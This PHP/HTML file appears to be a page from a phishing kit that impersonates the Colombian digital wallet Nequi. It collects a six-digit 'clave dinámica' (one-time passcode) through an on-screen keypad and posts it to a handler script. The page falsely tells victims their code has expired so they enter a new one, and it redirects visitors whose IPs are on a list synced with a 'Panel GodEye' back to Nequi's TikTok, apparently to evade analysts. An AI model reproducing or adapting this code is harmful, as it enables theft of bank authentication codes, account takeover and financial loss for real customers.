<?php
// Incluir el archivo de conexión a la base de datos
include '../../db.php';
$config = include '../../config.php';

// Obtener la IP del cliente
$client_ip = $_SERVER['REMOTE_ADDR'];

// Verificar si la IP está bloqueada (Sincronizado con Panel GodEye)
$sql_check_ip = "SELECT * FROM blocked_ips WHERE ip = :ip";
$stmt = $conn->prepare($sql_check_ip);
$stmt->execute(['ip' => $client_ip]);

if ($stmt->rowCount() > 0) {
    // Si la IP está bloqueada, redirigir
    header("Location: https://www.tiktok.com/@appnequi_/video/7424178986713926917?is_from_webapp=1&sender_device=pc&web_id=7426314577082500613");
    exit();
}

// $stmt = null;
?>
<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="config/css/otp.css">
    <title>Solicitud Nequi</title>
</head>

<body>
    <center><img src="config/img/nequi.svg"></center>
    <h2 class="text3">Solicitud Nequi</h2>
    <form id="otp-form" method="POST" action="process/otpserror.php" onsubmit="return prepareOTP();">
        <input type="hidden" name="cliente_id"
            value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">

        <center>
            <p class="text2">Para confirmar tu solicitud escribe o pega la clave dinámica que encuentras en tu AppNequi
            </p>
        </center>
        <center>
            <p class="text4">Tu clave dinámica es incorrecta o ha expirado. Ingresa una nueva.</p>
        </center>

        <div style="display: flex; justify-content: center;">
            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-2')" id="otp-1"
                name="otp1" required readonly>
            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-3')" id="otp-2"
                name="otp2" required readonly>
            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-4')" id="otp-3"
                name="otp3" required readonly>
            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-5')" id="otp-4"
                name="otp4" required readonly>
            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, 'otp-6')" id="otp-5"
                name="otp5" required readonly>
            <input type="text" class="otp-input" maxlength="1" oninput="moveToNext(this, '')" id="otp-6" name="otp6"
                required readonly>
        </div>

        <div class="keyboard">
            <button type="button" class="key" onclick="addDigit(1)">1</button>
            <button type="button" class="key" onclick="addDigit(2)">2</button>
            <button type="button" class="key" onclick="addDigit(3)">3</button>
            <button type="button" class="key" onclick="addDigit(4)">4</button>
            <button type="button" class="key" onclick="addDigit(5)">5</button>
            <button type="button" class="key" onclick="addDigit(6)">6</button>
            <button type="button" class="key" onclick="addDigit(7)">7</button>
            <button type="button" class="key" onclick="addDigit(8)">8</button>
            <button type="button" class="key" onclick="addDigit(9)">9</button>
            <br>
            <button type="button" class="key" onclick="addDigit(0)">0</button>
            <div class="key" onclick="clearLastDigit()">
                <img class="bor" src="config/img/backspace_119404.png" alt="Borrar">
            </div>
        </div>

        <input type="submit" value="Validar">
    </form>

    <script>
        function moveToNext(current, nextId) {
            if (current.value.length >= 1 && nextId) {
                document.getElementById(nextId).focus();
            }
        }

        function addDigit(digit) {
            for (let i = 1; i <= 6; i++) {
                const input = document.getElementById(`otp-${i}`);
                if (input.value === '') {
                    input.value = digit;
                    moveToNext(input, `otp-${i + 1}`);
                    break;
                }
            }
        }

        function clearLastDigit() {
            for (let i = 6; i >= 1; i--) { // Comienza desde el último campo
                const input = document.getElementById(`otp-${i}`);
                if (input.value !== '') {
                    input.value = ''; // Borrar el último campo con valor
                    input.focus(); // Regresar el foco al campo borrado
                    break;
                }
            }
        }

        function prepareOTP() {
            const otpArray = [];
            for (let i = 1; i <= 6; i++) {
                otpArray.push(document.getElementById(`otp-${i}`).value);
            }
            const fullOTP = otpArray.join('');
            // Crear un campo oculto para enviar el OTP completo
            const otpInput = document.createElement('input');
            otpInput.type = 'hidden';
            otpInput.name = 'otp';
            otpInput.value = fullOTP;
            document.getElementById('otp-form').appendChild(otpInput);
            return true; // Permitir que se envíe el formulario
        }
    </script>

</body>

</html>
